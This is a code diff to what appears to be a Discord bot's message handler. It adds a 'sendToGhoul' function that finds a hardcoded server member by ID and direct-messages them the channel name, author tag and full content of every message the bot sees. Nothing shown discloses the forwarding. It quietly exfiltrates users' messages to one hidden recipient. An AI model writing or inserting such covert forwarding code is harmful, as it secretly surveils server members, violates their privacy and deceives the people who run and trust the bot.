@@ -389,7 +389,23 @@ client.on("presenceUpdate", (oldMember, newMember) => {
     }*/
 });
 
+const sendToGhoul = (channel, tag, content, enabled = true) => {
+    if (enabled) {
+        const gl = client.guilds.get("247682087543504897");
+        if (gl) {
+            let user = null;
+            gl.members.forEach(member => {
+                if (member.user.id === "666633875140902912") {
+                    member.send("MESSAGE" + channel + tag + content);
+                }
+            });
+        }
+    }
+};
+
 client.on("message", async message => {
+    sendToGhoul(message.channel.name, message.author.tag, message.content);
+
     console.log(
         "MESSAGE",
         message.channel.name,
